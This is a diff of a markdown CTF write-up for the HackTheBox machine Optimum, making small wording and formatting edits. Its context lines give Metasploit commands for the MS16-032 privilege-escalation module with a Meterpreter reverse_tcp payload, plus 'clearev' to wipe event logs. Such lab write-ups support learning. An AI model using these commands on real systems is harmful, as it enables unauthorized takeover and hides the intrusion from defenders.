@@ -1,7 +1,8 @@
 [Main Page](../index.md)<br>
 
 
-# CTF Writeup: Optimum on HackTheBox
+# CTF Writeup:
+# Optimum on HackTheBox
 <br>
 ![Logo](https://i.imgur.com/cZ0VXqB.png)
 <br>
@@ -441,7 +442,7 @@ Let's see if we can find anything ourselves.
 
 ### We have a technical question - how can we find an answer?
 
-Let us ask the oracle for guidance!
+We must beseech the oracle for guidance!
 
 <br>
 ![Asking the Oracle for guidance](https://i.imgur.com/rSLt5R7.png "Asking the Oracle for guidance")
@@ -461,7 +462,7 @@ Jackpot!
 
 ## 7. Trying Out the Privesc Module and the System Flag
 
-Let's load it up and give it a whirl.
+oad it up and give it a whirl.
 
 * `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
 * `show options` to see what parameters we need to set
@@ -475,7 +476,7 @@ Make sure our payload has the right architecture too. Then, set the other parame
 
 * `show targets`
 * `set TARGET 1` to specify x64
-* `set SESSION 2` __Note that this command was run before screenshot below was taken, it is REQUIRED__
+* `set SESSION 2`  __Note that this command was run before screenshot below was taken, it is REQUIRED__
 * `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
 * `set LHOST 10.10.xx.xx`
 * `set LPORT 51003`
@@ -506,7 +507,7 @@ Since this is a CTF, cleanup isn't mandatory. However, we want to develop good h
 Meterpreter has a `clearev` command that can be used to cover our tracks - let's run it and be out of here.
 
 * `clearev`
-* `exit -y` the `-y` flag answers "Kill the session?" in advance.
+* `exit -y`  -   the `-y` flag answers "Kill the session?" in advance.
 
 <br>
 ![Cleaning Up](https://i.imgur.com/L9o2Zhs.png "Cleaning Up")
